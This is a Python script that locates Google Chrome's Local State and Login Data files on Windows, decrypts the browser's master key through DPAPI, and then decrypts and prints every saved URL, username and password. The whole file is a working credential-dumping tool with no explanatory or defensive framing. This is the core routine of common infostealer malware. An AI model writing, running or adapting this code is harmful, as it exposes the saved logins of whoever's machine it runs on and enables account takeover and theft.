import os
import shutil
import sqlite3
import json
import base64
from Crypto.Cipher import AES
import win32crypt


def get_chrome_pass():
    user_profile = os.path.expanduser('~')
    data_path = os.path.join(user_profile, r'AppData\Local\Google\Chrome\User Data\Default')
    local_state_path = os.path.join(user_profile, r'AppData\Local\Google\Chrome\User Data\Local State')

    if not os.path.exists(local_state_path):
        raise FileNotFoundError(f"Local State file not found: {local_state_path}")

    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)

    master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = master_key[5:]  # Remove 'DPAPI' prefix
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

    db_path = os.path.join(data_path, 'Login Data')

    if not os.path.exists(db_path):
        raise FileNotFoundError(f"Login Data file not found: {db_path}")

    shutil.copyfile(db_path, 'Loginvault.db')

    conn = sqlite3.connect('Loginvault.db')
    cursor = conn.cursor()

    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    login_data = cursor.fetchall()

    passwords = []

    for url, user_name, pwd in login_data:
        if url:
            try:
                iv = pwd[3:15]
                encrypted_password = pwd[15:]

                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                decrypted_password = cipher.decrypt_and_verify(encrypted_password[:-16],
                                                               encrypted_password[-16:]).decode()
            except Exception as e:
                decrypted_password = "Could not decrypt"

            passwords.append({'url': url, 'username': user_name, 'password': decrypted_password})

    cursor.close()
    conn.close()
    os.remove('Loginvault.db')

    return passwords


if __name__ == "__main__":
    try:
        passwords = get_chrome_pass()
        for entry in passwords:
            print(f"URL: {entry['url']}")
            print(f"Username: {entry['username']}")
            print(f"Password: {entry['password']}")
            print()
    except Exception as e:
        print(f"Error: {e}")
